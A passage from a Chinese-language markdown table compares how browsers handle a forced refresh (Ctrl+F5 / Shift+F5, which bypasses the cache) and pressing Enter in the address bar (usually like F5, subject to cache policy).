| **强制刷新（Ctrl + F5 / Shift + F5）** | **忽略缓存**                     | 浏览器**不使用缓存**，所有资源重新向服务器请求（强制 200 OK） | 用于确保获取最新版本的资源                                   |
| **地址栏回车刷新**                     | **普通刷新行为**（视浏览器实现） | 通常与 F5 相同，会检查缓存                                   | 有些浏览器可能像 F5，也可能使用缓存，具体依赖缓存策略        |
